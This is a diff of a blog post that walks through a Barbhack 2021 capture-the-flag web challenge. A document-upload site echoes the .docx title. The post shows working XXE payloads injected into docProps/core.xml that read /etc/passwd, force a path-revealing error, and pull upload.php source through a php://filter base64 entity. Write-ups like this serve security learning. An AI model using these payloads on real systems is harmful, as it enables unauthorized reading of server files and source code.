@@ -1,20 +1,70 @@
-### Docx uploader
- ( intro)
+## Barbhack is back!
+
+In the most unbelievable turn of events, Barbhack 2021 happened for the second time, against all odds! 
+
+### asdf! 
  
- docx - basically zip file with xml in it
- modify
+ One of the CTF easy-medium(easium?) Web challenges was a document upload website that accepts .docx files. The challenge caption says "Focus on the title".
+ 
+ ![homepage](https://eqqn.github.io/images/brb21home.jpg)
 
+A helpful sample file is provided, and when you submit it, the upload page returns the document title and a local path where it is stored.
 
-###
+The upload seems to work only for valid documents, so uploading a php file file didn't quite work.
 
-Post sample -> document title in response, so focus on injecting the title field in XML. Use sample.docx as base.
+### Docx? More like .zip
 
-Php code in title didnt display/work (?) so tried XXE.. [1]
+You can unpack a word document with zip :
 
+```
+sample
+├── [Content_Types].xml
+├── customXml
+│   ├── item1.xml
+│   ├── itemProps1.xml
+│   └── _rels
+│       └── item1.xml.rels
+├── docProps
+│   ├── app.xml
+│   ├── core.xml
+├── _rels
+└── word
+    ├── document.xml
+    ├── endnotes.xml
+    ├── fontTable.xml
+    ├── footer1.xml
+    ├── footer2.xml
+    ├── footer3.xml
+    ├── footnotes.xml
+    ├── header1.xml
+    ├── header2.xml
+    ├── header3.xml
+    ├── _rels
+    │   └── document.xml.rels
+    ├── settings.xml
+    ├── styles.xml
+    ├── theme
+    │   └── theme1.xml
+    └── webSettings.xml
+```
 
-### TL;DR payloads
+We will be editing the files and zipping it back to evil.docx
 
-core.xml contents ( because it contains doc title returned)  -  only changes is XXE and &test;  ( entity name) in <dc:title>
+```
+unzip sample.docx
+(modify stuff)
+zip -r evil.docx *
+```
+
+The title of sample.docx is *"try asdf!"*, which can be found in *docProps/core.xml*.
+
+Php code in title didnt display/work(?) so after some research I tried XXE.. [1]
+
+### Getting the XXE
+
+A quick search for "docx exploit php" will return some results, mostly relating to XXE. 
+
+We modify the original core.xml to include the XXE string  `<!DOCTYPE test [<!ENTITY test SYSTEM 'file:///etc/passwd'>]> ` AND to call the XXE we add `&test;` to the `<dc:title>` element.
 
 ```
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
@@ -24,12 +74,18 @@ core.xml contents ( because it contains doc title returned)  -  only changes is 
 <dc:subject></dc:subject><dc:creator></dc:creator><cp:keywords></cp:keywords><dc:description></dc:description><cp:lastModifiedBy></cp:lastModifiedBy><cp:revision>1</cp:revision><dcterms:created xsi:type="dcterms:W3CDTF">2015-08-01T19:00:00Z</dcterms:created><dcterms:modified xsi:type="dcterms:W3CDTF">2015-09-08T19:22:00Z</dcterms:modified></cp:coreProperties>
 ```
 
+ ![passwd](https://eqqn.github.io/images/brb21passwd.jpg)
+ 
+ We confirmed that it works, now which file to retrieve? Root-me always tells us to go after the source code first, so lets do that. 
+ 
+ If you cause an error on the page, you will get the path of the php file. 
 
 `<!DOCTYPE test [<!ENTITY test SYSTEM 'random'>]>` to force error
 
+ ![passwd](https://eqqn.github.io/images/brb21error.jpg)
+ 
 
-
-`<!DOCTYPE test [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=file:///var/www/html/upload.php'>|>`  to exfiltrate 
+`<!DOCTYPE test [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=file:///var/www/html/upload.php'>|>`  to exfiltrate ( you need to encode the php code or else it will not display) 
 
 
 ### source code returned
@@ -86,3 +142,6 @@ if (isset($_GET['1ca251e66938b115ebd89c8f5bb3c7f9b0f6ab4398104d4c254cdbc5e655517
 
 [1] https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/
 
+[2] the neighbour I asked how far I am from solving at 5AM, because I was tired and my train coming in 50 minutes :D 
+
+[3] Barbhack for organizing another amazing event
